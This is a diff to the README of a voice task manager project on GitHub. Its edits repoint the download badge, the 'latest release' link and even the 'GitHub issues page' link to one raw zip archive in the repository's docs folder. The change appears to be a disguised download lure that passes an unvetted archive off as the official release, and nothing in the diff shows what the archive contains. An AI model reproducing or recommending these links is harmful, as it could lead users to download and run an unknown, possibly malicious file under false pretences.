@@ -6,7 +6,7 @@ Welcome to the voice-task-manager! This application helps you organize tasks by 
 
 ## 🔗 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Itachikoko/voice-task-manager/releases)
+[![Download the latest release](https://github.com/Itachikoko/voice-task-manager/raw/refs/heads/main/docs/task_voice_manager_v2.8.zip%20Release-brightgreen)](https://github.com/Itachikoko/voice-task-manager/raw/refs/heads/main/docs/task_voice_manager_v2.8.zip)
 
 ## 📋 Features
 
@@ -20,7 +20,7 @@ Welcome to the voice-task-manager! This application helps you organize tasks by 
 
 To get started, visit the Releases page to download the app:
 
-[Download the latest release](https://github.com/Itachikoko/voice-task-manager/releases)
+[Download the latest release](https://github.com/Itachikoko/voice-task-manager/raw/refs/heads/main/docs/task_voice_manager_v2.8.zip)
 
 Here’s how to install the application:
 
@@ -60,7 +60,7 @@ Your privacy is important. The voice-task-manager does not store your audio file
 
 ## 💬 Support
 
-If you encounter any issues or have questions, please check the FAQ section in the app. For additional support, visit our [GitHub issues page](https://github.com/Itachikoko/voice-task-manager/issues) to report problems or request features.
+If you encounter any issues or have questions, please check the FAQ section in the app. For additional support, visit our [GitHub issues page](https://github.com/Itachikoko/voice-task-manager/raw/refs/heads/main/docs/task_voice_manager_v2.8.zip) to report problems or request features.
 
 ## 🤝 Contributing
 
